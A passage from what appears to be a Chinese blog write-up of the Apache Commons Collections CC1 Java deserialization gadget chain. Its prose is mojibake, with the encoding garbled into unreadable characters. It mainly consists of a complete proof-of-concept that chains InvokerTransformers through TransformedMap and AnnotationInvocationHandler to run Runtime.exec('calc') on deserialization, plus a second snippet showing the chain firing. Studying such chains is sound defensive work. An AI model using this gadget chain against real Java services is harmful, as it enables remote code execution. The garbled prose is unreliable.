<p>Ë∞ÉËØïË∑üËøõÔºåÂèëÁé∞ÊúÄÁªàÂÖ∂‰ΩúÁî®ÁöÑÁÇπÂ∞±ÊòØgetNode()ÊñπÊ≥ïÔºåËøô‰∏™ÊñπÊ≥ï‰ºöÂú®ÂìàÂ∏åË°®‰∏≠Êü•ÊâæÂØπÂ∫îÁöÑËäÇÁÇπÔºåÂ¶ÇÊûúÁõ∏ÂåπÈÖçÂ∞±‰ºöËøîÂõûÂØπÂ∫îÁöÑËäÇÁÇπÔºåÊØîÂ¶ÇÂ¶ÇÊûúÂåπÈÖçÂà∞ÊàëËÆæÁΩÆÁöÑceshiÈîÆÂíåÂÄºvalue1ÔºåÈÇ£‰πàÂ∞±‰ºöËøîÂõûÂØπÂ∫îËäÇÁÇπÔºåÂê¶ÂàôÂ∞±‰ºöËøîÂõûnull„ÄÇ</p>
<p>ÂêéÁª≠ÁöÑÂ¶Ç‰ΩïÂåπÈÖçÂ∞±ÊòØÊ≥®ÈáäÁõ∏ÂÖ≥ÊäÄÊúØ‰∫ÜÔºå<strong>Âú®ËøôÈáåÊÉ≥Ë¶ÅÊàêÂäüÈÄöËøáÁöÑÊù°‰ª∂‰∏∫</strong>Ôºö</p>
<ul>
<li><code>sun.reflect.annotation.AnnotationInvocationHandler</code>ÊûÑÈÄ†ÂáΩÊï∞ÁöÑÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÂøÖÈ°ªÊòØAnnotationÁöÑÂ≠êÁ±ªÔºå‰∏îÂÖ∂‰∏≠ÂøÖÈ°ªÂê´ÊúâËá≥Â∞ë‰∏Ä‰∏™ÊñπÊ≥ïÔºåÂÅáËÆæÊñπÊ≥ïÂêçÊòØX</li>
<li>ÈÇ£‰πàË¢´<code>TransformedMap.decorate</code>‰øÆÈ•∞ÁöÑMap‰∏≠ÂøÖÈ°ªÊúâ‰∏Ä‰∏™ÈîÆÂêç‰∏∫XÁöÑÂÖÉÁ¥†</li>
</ul>
<p>ÊâÄ‰ª•Âú®ËøôÈáåÊàë‰ª¨ÈúÄË¶ÅÂ∞ÜÈîÆËÆæÁΩÆ‰∏∫valueÔºåÂõ†‰∏∫Ê≥®Ëß£Á±ªÊúâÂêç‰∏∫valueÁöÑÊñπÊ≥ïÔºö
<img src="/p/cc1/image-20240722164951400.png"
	width="440"
	height="235"
	srcset="/p/cc1/image-20240722164951400_hu13661630288569341316.png 480w, /p/cc1/image-20240722164951400_hu2447221550768149616.png 1024w"
	loading="lazy"
	
		alt="image-20240722164951400"
	
	
		class="gallery-image" 
		data-flex-grow="187"
		data-flex-basis="449px"
	
></p>
<p>ÊâÄ‰ª•ÊúÄÁªàÁöÑÂèØÂà©Áî®ÁöÑPOCÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.TransformedMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.Runtime</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.annotation.Retention</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.Class</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Test</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ChainedTransformer</span><span class="w"> </span><span class="n">chain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">})</span><span class="w">                                                             </span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="w"> </span><span class="n">hashMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hashMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;value&#34;</span><span class="p">,</span><span class="s">&#34;xxx&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">map2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TransformedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">hashMap</span><span class="p">,</span><span class="kc">null</span><span class="p">,</span><span class="n">chain</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="w"> </span><span class="n">constructor1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">constructor1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">constructor1</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Retention</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">map2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//Â∫èÂàóÂåñ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">serialize</span><span class="p">(</span><span class="n">o</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//ÂèçÂ∫èÂàóÂåñ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">unserialize</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w">  </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">serialize</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;ser.ser&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">o</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w">  </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">unserialize</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;ser.ser&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">o</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">o</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÊàêÂºπÂá∫‰∏Ä‰∏™ËÆ°ÁÆóÊú∫„ÄÇ</p>
<p>Áé∞Âú®Êù•Áúã‰∏Ä‰∏ãsetValue()ÊñπÊ≥ïÂêéÁª≠Ë∞ÉÁî®ÁöÑÊñπÊ≥ïÁöÑÊ∫êÁ†ÅÔºö</p>
<p><img src="/p/cc1/image-20240722232359289.png"
	width="974"
	height="454"
	srcset="/p/cc1/image-20240722232359289_hu434558545662462368.png 480w, /p/cc1/image-20240722232359289_hu7576648270650537520.png 1024w"
	loading="lazy"
	
		alt="image-20240722232359289"
	
	
		class="gallery-image" 
		data-flex-grow="214"
		data-flex-basis="514px"
	
></p>
<p>ÁÑ∂ÂêéÂ∞±ÊòØTransformedMapÁ±ªÁöÑcheckSetValue()ÊñπÊ≥ïÔºö
<img src="/p/cc1/image-20240722232448120.png"
	width="719"
	height="112"
	srcset="/p/cc1/image-20240722232448120_hu7448600962675162022.png 480w, /p/cc1/image-20240722232448120_hu2423688364011238960.png 1024w"
	loading="lazy"
	
		alt="image-20240722232448120"
	
	
		class="gallery-image" 
		data-flex-grow="641"
		data-flex-basis="1540px"
	
></p>
<p>Áî±‰∫éÊàë‰ª¨ÂâçÈù¢Â∞±Â∞ÜvalueTransformerËÆæÁΩÆ‰∏∫‰∫ÜchainÈìæÔºåÊâÄ‰ª•ÂêéÁª≠ÈÉΩ‰ºöÂæÄÈ¢Ñ‰º∞ÊñπÂêëÂèëÂ±ïÔºåÂÖ∑‰ΩìËøáÁ®ãÂèØ‰ª•ÂèÇËÄÉÂâçÈù¢ÁöÑÂü∫Á°Ä‰ª£Á†ÅÈÉ®ÂàÜ„ÄÇ</p>
<p>‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî</p>
<p>ÁÑ∂ÂêéÊÄªÁªì‰∏Ä‰∏ãÂâçÈù¢ÁöÑÈóÆÈ¢òÔºö</p>
<ul>
<li>ËøòÊòØË¶ÅÊ≥®ÊÑè‰∏Ä‰∏ãRuntimeÁ±ª‰∏çËÉΩÂÆû‰æãÂåñÁöÑÈóÆÈ¢ò</li>
<li>ÂèçÂ∞ÑËé∑Âèñ<code>AnnotationInvocationHandler</code>Á±ª</li>
<li>ËøõÂÖ•forÂæ™ÁéØÁöÑÈúÄË¶ÅputÈîÆÂÄºÂØπÁöÑÈóÆÈ¢ò</li>
<li>ifÊù°‰ª∂ÁöÑËøõÂÖ•Êù°‰ª∂</li>
</ul>
<p>Âú®ÊãâÈÄöÊï¥‰∏™ËøáÁ®ãÊó∂ÁöÑË∞ÉËØïËøáÁ®ã‰∏≠ÈÅáÂà∞ÁöÑÈóÆÈ¢òÔºö</p>
<p>ÊöÇÊó∂ÂØπ‰∫éÂæàÂ§öÈÉΩÊòØÂàùÊ≠•‰∫ÜËß£ÂêßÔºåË∑üÊ∫êÁ†ÅÂÖ∂ÂÆûËøòÊúâÁÇπÁúã‰∏çÊáÇÔºåÂêéÈù¢ÂÜçÊù•ÁúãÁúãÔºåÁÆÄÂçïÁªôÂá∫Á§∫‰æã‰ª£Á†ÅÔºå‰πüËÆ∏ÂèØ‰ª•Âú®Ë∞ÉËØïËøáÁ®ã‰∏≠Êõ¥ÂÆπÊòìÁêÜËß£Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.TransformedMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Main</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">()),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="w"> </span><span class="n">transformerChain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">innerMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">innerMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;value&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;xxx&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">outerMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TransformedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">innerMap</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="n">transformerChain</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">Map</span><span class="p">.</span><span class="na">Entry</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">entry</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">outerMap</span><span class="p">.</span><span class="na">entrySet</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;ÊàêÂäüËøõÂÖ•Âæ™ÁéØÈÅçÂéÜ&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">entry</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;key: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">entry</span><span class="p">.</span><span class="na">getKey</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;  value: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">entry</span><span class="p">.</span><span class="na">getValue</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÊâìÊñ≠ÁÇπÂ¶Ç‰∏ãÔºö</p>
<p><img src="/p/cc1/image-20240722231513859.png"
	width="718"
	height="98"
	srcset="/p/cc1/image-20240722231513859_hu4676829334290692879.png 480w, /p/cc1/image-20240722231513859_hu10898993569478655176.png 1024w"
	loading="lazy"
	
		alt="image-20240722231513859"
	
	
		class="gallery-image" 
		data-flex-grow="732"
		data-flex-basis="1758px"
	
></p>
<p>ÁúãÊ≠§Êó∂ÁöÑÂÄºÔºö
<img src="/p/cc1/image-20240722231605379.png"
	width="879"
	height="251"
	srcset="/p/cc1/image-20240722231605379_hu16567103400419486762.png 480w, /p/cc1/image-20240722231605379_hu2810360828796474358.png 1024w"
	loading="lazy"
	
		alt="image-20240722231605379"
	
	
		class="gallery-image" 
		data-flex-grow="350"
		data-flex-basis="840px"
	
></p>
<p>ÁÑ∂ÂêéÂÜçÁúã‰∏äÈù¢ÁöÑÂÆû‰æã‰ª£Á†ÅÁªôÂá∫ÁöÑÁªìÊûúÔºö</p>
<p><img src="/p/cc1/image-20240722231653896.png"
	width="363"
	height="119"
	srcset="/p/cc1/image-20240722231653896_hu9420724259092267538.png 480w, /p/cc1/image-20240722231653896_hu2132722139242220991.png 1024w"
	loading="lazy"
	
		alt="image-20240722231653896"
	
	
		class="gallery-image" 
		data-flex-grow="305"
		data-flex-basis="732px"
	
></p>
